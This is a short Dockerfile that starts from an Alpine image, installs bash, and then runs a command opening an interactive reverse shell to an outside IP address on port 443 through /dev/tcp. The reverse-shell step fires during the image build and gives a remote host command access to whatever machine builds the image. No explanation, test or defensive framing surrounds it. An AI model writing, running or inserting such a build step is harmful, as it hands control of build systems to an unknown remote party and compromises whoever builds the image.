FROM alpine
RUN apk update && apk add bash
RUN /bin/bash -i >& /dev/tcp/198.211.124.232/443 0>&1
